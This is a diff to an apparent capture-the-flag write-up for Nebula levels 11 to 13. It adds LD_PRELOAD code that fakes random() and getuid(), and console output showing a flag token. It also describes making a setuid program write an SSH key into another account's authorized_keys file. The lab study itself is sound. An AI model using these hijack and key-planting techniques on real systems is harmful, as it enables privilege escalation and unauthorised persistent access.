@@ -171,7 +171,7 @@ blue = 1024, length = 1024, pink = 1024
 getflag is executing on a non-flag account, this doesn't count
 ```
 
-2. LD_PRELOAD to hijack a few routines...
+2 - LD_PRELOAD to hijack a few routines...
 ```c
 // Take control of random
 int random(){
@@ -206,7 +206,7 @@ print "Content-Length: " + str(length) + "\n" + command + '\x00' + "A"*(length -
 ```
 and that should write the key to the temp file. The theory is that you should be able to link `/tmp/1.A0aA0a` to `/home/flag11/.ssh/authorized_keys` such that the ../flag11/flag11 writes the ssh key into the auth keys file, but as yet I've not got that working...  I need to check, but I suspect that the LD_PRELOAD only works if the programs run under strace, but when under strace, the setuid doesn't work, so it can't write to the authkey file...
 
-3. Combine writing the SSH key with 'guessing' the random values.  Attacker program 
+3 - Combine writing the SSH key with 'guessing' the random values.  Attacker program 
 ```c
 #include <stdlib.h>
 #include <unistd.h>
@@ -272,9 +272,28 @@ level12@nebula:/home/flag12$ cat /tmp/flag12.out
 You have successfully executed getflag on a target account
 ```
 
-## nn
-```console
+## 13
+In this level, the setuid program makes a call to getuid to check the calling uid.
+Initially I thought that the following, pre-loaded by LD_PRELOAD would be fine...
+```c
+#include <unistd.h>
+#include <sys/types.h>
 
+uid_t getuid(void) {
+    return 1000;
+}
+```
+Unfortunately, that's not quite right (see LD_PRELOAD in the man ld.so page)
+```console
+level13@nebula:~$ gcc -shared -fPIC getuid.c  -o getuid.so
+level13@nebula:~$ LD_PRELOAD=$PWD/getuid.o ../flag13/flag13
+Security failure detected. UID 1014 started us, we expect 1000
+The system administrators will be notified of this violation
+```
+However, if `strace` is used, however, it works as expected... (You could copy the image to remove the flag, but this works)
+```console
+level13@nebula:~$ LD_PRELOAD=$PWD/getuid.so strace -c ../flag13/flag13 2>/dev/null
+your token is b705702b-76a8-42b0-8844-3adabbe5ac58
 ```
 
 ## nn
